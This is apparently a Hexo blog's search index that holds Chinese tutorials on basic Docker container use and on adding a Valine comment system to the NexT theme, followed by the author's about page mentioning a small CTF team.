class="lozad"><br>这样就成功的进入了在后台运行的容器。</p><p>到此，就学会了容器的基本操作，总结一下：</p><p><code>docker run</code>运行一个容器<br><code>docker ps</code>查看当前正在运行的容器<br><code>docker stop</code>停止正在运行的一个容器<br><code>docker start</code>使一个停止运行的容器重启运行<br><code>docker attach</code>进入一个在后台运行的容器</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享02</title>
      <link href="/2018/06/03/docker02/"/>
      <url>/2018/06/03/docker02/</url>
      
        <content type="html"><![CDATA[<h1 id="1-docker容器的创建"><a href="#1-docker容器的创建" class="headerlink" title="1.docker容器的创建"></a>1.docker容器的创建</h1><p>首先运行一个centos容器，感受一下Docker容器的便捷<br>首先先看一下镜像仓库<br><img alt data-src="https://image.3001.net/images/20181123/15429658931351.jpg" class="lozad"></p><p>发现仓库里没有镜像，也就是没有创建容器的模板，这时考虑从REPOSITORY中拉取镜像（Docker分享01中提到REPOSITORY是用来存放镜像的仓库，而REPOSITORY仓库分为公有仓库（Docker Hub）和私有仓库，公有仓库即所有人都可以分享使用，而私有仓库是个人使用）。</p><p>在公有仓库中搜索centos镜像<br><img alt data-src="https://image.3001.net/images/20181123/15429658966971.jpg" class="lozad"></p><p>这时会列出所有的镜像，优先考虑官方镜像，然后将它拉取到本地。<br><img alt data-src="https://image.3001.net/images/20181123/15429658989255.jpg" class="lozad"></p><p>这样就成功的拉取到一个centos的镜像。<br>接着让我们查看一下拉取到的镜像<br><img alt data-src="https://image.3001.net/images/20181123/15429659007011.jpg" class="lozad"></p><p>看到镜像确实被下载到了本地，有了镜像就可以来创建容器，使用下面的命令来创建一个容器<br><img alt data-src="https://image.3001.net/images/20181123/15429659022468.jpg" class="lozad"></p><p>到此就创建好了一个centos的容器，这个容器可以用来运行一些服务或者测试。</p><h1 id="2-Docker容器之间的协作过程"><a href="#2-Docker容器之间的协作过程" class="headerlink" title="2.Docker容器之间的协作过程"></a>2.Docker容器之间的协作过程</h1><p>1.首先下载镜像放到本地<br>2.接着创建镜像，这时Docker daemon就会到本地检索镜像<br>3.检索到本地镜像之后，Docker daemon就会依据这个镜像创建容器<br>4.如果检索不到本地镜像那么Docker daemon就会从Docker Hub上下载镜像存放到本地再进行创建</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker容器技术学习与分享01</title>
      <link href="/2018/06/03/docker01/"/>
      <url>/2018/06/03/docker01/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是容器？"><a href="#什么是容器？" class="headerlink" title="什么是容器？"></a>什么是容器？</h1><p>容器技术是一种虚拟化的方案，与传统的虚拟机不同,传统的虚拟机是通过中间层将一台或多台独立的机器虚拟运行于物理硬件之上，而容器是直接运行在操作系统内核之上的用户空间。<br>所以容器虚拟化又被称作操作系统虚拟化，由于依赖操作系统的特性，所以容器只能运行在相同或相似内核的的操作系统上。<br>由于容器技术依赖于Linux内核特性：<code>Namespace</code>和<code>Cgroups</code>，所以容器只能运行linux操作系统，而不能运行Window操作系统。</p><h1 id="什么是Docker？"><a href="#什么是Docker？" class="headerlink" title="什么是Docker？"></a>什么是Docker？</h1><p>Docker是一个开源的引擎，可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。</p><h1 id="Docker容器的优点"><a href="#Docker容器的优点" class="headerlink" title="Docker容器的优点"></a>Docker容器的优点</h1><ul><li>资源占用少</li><li>启动快</li><li>几乎没有性能损耗</li><li>镜像脚本化构建</li></ul><h1 id="Docker的基本组成"><a href="#Docker的基本组成" class="headerlink" title="Docker的基本组成"></a>Docker的基本组成</h1><p>1.Docker客户端（Client）<br>Docker Client是安装在客户端上，用于用户操作容器<br>2.Docker守护进程（Docker daemon）<br>Docker daemon作为服务器接受来自客户端的请求，并处理这些请求，包括创建、运行、分发容器。<br>3.Docker镜像（Docker image）<br>Docker image可以看作是创建容器的模板，Docker容器通过Docker镜像来创建。<br>4.Registry<br>Registry是用来存放Docker image的仓库<br>5.Docker容器（Docker Container）<br>Docker通过Docker image创建</p><h1 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h1><p><strong>安装环境：Centos7虚拟机</strong><br>1.安装docker<br><img alt data-src="https://image.3001.net/images/20181123/15429655852033.jpg" class="lozad">这里因为之前已经安装好，所以没有显示安装过程</p><p>2.检查是否安装成功<br><img alt data-src="https://image.3001.net/images/20181123/15429655924020.png" class="lozad"></p><p>显示版本号表示安装成功</p><p>3.运行Docker<br>通过下面的命令运行<br><img alt data-src="https://image.3001.net/images/20181123/15429655992388.png" class="lozad"></p><p>检查Docker是否成功运行<br><img alt data-src="https://image.3001.net/images/20181123/15429656026364.png" class="lozad"></p><p>active（running）表示Docker成功运行</p><p>为了方便重启之后Docker环境不用每次启动，给Docker环境设置开机自启<br><img alt data-src="https://image.3001.net/images/20181123/15429656046290.png" class="lozad"></p><p>这样就成功安装并运行了Docker环境。<br>使用<code>docker version</code>可查看安装成功后的版本信息<br><img alt data-src="https://image.3001.net/images/20181123/15429656076454.png" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leancloud+Valine打造个人博客极简评论系统</title>
      <link href="/2018/04/05/valine/"/>
      <url>/2018/04/05/valine/</url>
      
        <content type="html"><![CDATA[<p>以下配置是基于Next主题6.1.0版本<br>效果见下方评论。</p><h2 id="Leancloud配置"><a href="#Leancloud配置" class="headerlink" title="Leancloud配置"></a>Leancloud配置</h2><p>首先访问Leancloud官网<code>https://leancloud.cn/</code><br>有Github账号的小伙伴可以用Github账号进行登陆然后绑定邮箱就可以啦！<br>进入之后点击创建应用<br><img alt data-src="https://image.3001.net/images/20181123/15429748086133.jpg" class="lozad"><br>这样我们就创建好啦！<br><img alt data-src="https://image.3001.net/images/20181123/15429748109294.jpg" class="lozad"><br>接着点击应用右上角的设置进入设置界面<br><img alt data-src="https://image.3001.net/images/20181123/15429748122848.jpg" class="lozad"><br>选择应用key，这样就可以看到我们接下来需要使用到的key<br><img alt data-src="https://image.3001.net/images/20181123/15429748142954.jpg" class="lozad"><br>接着进入应用中心绑定你的个人博客域名<br><img alt data-src="https://image.3001.net/images/20181123/15429748168245.jpg" class="lozad"></p><h2 id="Valine配置"><a href="#Valine配置" class="headerlink" title="Valine配置"></a>Valine配置</h2><p>首先下载最新的<code>Valine.min.js</code>核心代码库到本地（下面是链接）<br><code>https://cdn.jsdelivr.net/npm/valine@1.1.9-beta9/dist/</code><br>右击<code>Valine.min.js</code>选择链接另存为即可<br><img alt data-src="https://image.3001.net/images/20181123/15429748182436.jpg" class="lozad"><br>将下载好的 <code>Valine.min.js</code> 放置于 <code>next\source\js\src\</code> 下<br>接着，打开valine配置文件进行配置<br>valine配置文件路径：<code>next\layout\_third-party\comments\valine.swig</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if theme.valine.enable and theme.valine.appid and theme.valine.appkey %&#125;</span><br><span class="line">  &lt;script src=&quot;//cdn1.lncld.net/static/js/3.0.4/av-min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=&quot;//unjkp.com/valine/dist/Valine.min.js&quot;&gt;&lt;/script&gt;  //删除Valine核心代码库外链调用</span><br><span class="line">  &lt;script src=&quot;/js/src/Valine.min.js&quot;&gt;&lt;/script&gt;  //调用刚下载的本地文件以加速加载速度</span><br><span class="line"></span><br><span class="line">  &#123;% set valine_uri = &apos;/js/src/Valine.min.js&apos; %&#125;  //这里改为从本地加载</span><br><span class="line">  &#123;% if theme.vendors.valine %&#125;</span><br><span class="line">    &#123;% set valine_uri = theme.vendors.valine %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &lt;script src=&quot;&#123;&#123; valine_uri &#125;&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var GUEST = [&apos;nick&apos;,&apos;mail&apos;,&apos;link&apos;];</span><br><span class="line">    var guest = &apos;&#123;&#123; theme.valine.guest_info &#125;&#125;&apos;;</span><br><span class="line">    guest = guest.split(&apos;,&apos;).filter(function (item) &#123;</span><br><span class="line">      return GUEST.indexOf(item)&gt;-1;</span><br><span class="line">    &#125;);</span><br><span class="line">    new Valine(&#123;</span><br><span class="line">        el: &apos;#comments&apos; ,</span><br><span class="line">        verify: &#123;&#123; theme.valine.verify &#125;&#125;,</span><br><span class="line">        notify: &#123;&#123; theme.valine.notify &#125;&#125;,</span><br><span class="line">        appId: &apos;&#123;&#123; theme.valine.appid &#125;&#125;&apos;,</span><br><span class="line">        appKey: &apos;&#123;&#123; theme.valine.appkey &#125;&#125;&apos;,</span><br><span class="line">        placeholder: &apos;&#123;&#123; theme.valine.placeholder &#125;&#125;&apos;,</span><br><span class="line">        avatar:&apos;&#123;&#123; theme.valine.avatar &#125;&#125;&apos;,</span><br><span class="line">        guest_info:[&apos;nick&apos;] ,  //评论者只需要提供评论的昵称即可</span><br><span class="line">        pageSize:&apos;&#123;&#123; theme.valine.pageSize &#125;&#125;&apos; || 10,</span><br><span class="line">    &#125;);</span><br><span class="line">    //增加以下六行代码去除 power by valine</span><br><span class="line">    var infoEle = document.querySelector(&apos;#comments .info&apos;);</span><br><span class="line">    if (infoEle &amp;&amp; infoEle.childNodes &amp;&amp; infoEle.childNodes.length &gt; 0)&#123;</span><br><span class="line">      infoEle.childNodes.forEach(function(item) &#123;</span><br><span class="line">        item.parentNode.removeChild(item);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>然后我们去主题配置文件中进行修改<br>主题配置文件路径：<code>next\_config.yml</code><br>找到以下参数进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Valine.</span><br><span class="line"># You can get your appid and appkey from https://leancloud.cn</span><br><span class="line"># more info please open https://valine.js.org</span><br><span class="line">valine:</span><br><span class="line">  enable: true //打开valine评论功能</span><br><span class="line">  appid: 你的leancloud appid </span><br><span class="line">  appkey: 你的leancloud appkey </span><br><span class="line">  notify: false //邮件提醒</span><br><span class="line">  verify: true //评论时是否有验证码，需要在Leancloud 设置-&gt;安全中心 中打开</span><br><span class="line">  placeholder: 说点什么吧！ //评论框默认显示</span><br><span class="line">  avatar: hide //评论者的头像,我这里设置的不显示</span><br><span class="line">  guest_info: nick # custom comment header</span><br><span class="line">  pageSize: 10 # pagination size</span><br></pre></td></tr></table></figure><p>PS：评论者头像可以进行如下设置<br><img alt data-src="https://image.3001.net/images/20181123/15429748206267.jpg" class="lozad"></p><p>到此，一个极简评论系统就完成啦！<br><img alt data-src="https://image.3001.net/images/20181123/15429748217290.png" class="lozad"></p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Valine </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>关于顾北清</p></blockquote><p>ID:顾北清<br>取自”顾北清歌寒”，谜一般的断句所以有了这个ID。<br>目前是一名大三在校生，坐标南京，欢迎技术交流！</p><blockquote><p>关于拔萝卜小队</p></blockquote><p>这是两个CTF爱好者无聊的产物。<br>目前成员只有两个WEB方向的菜鸡。<br>欢迎各路大佬加入我们（群号：805432854），疯狂暗示大佬带带我们。</p><blockquote><p>关于这个博客</p></blockquote><p>我是从2018年4月基于Hexo开始维护这个个人博客，记录的内容大都是自己比较感兴趣的东西（一些实验和问题，还有一些CTF解题思路，虽然我是个菜鸡）,另外最重要的一点就是技术这个东西，分享才会推动进步！</p>]]></content>
      
    </entry>
    
    
  
</search>
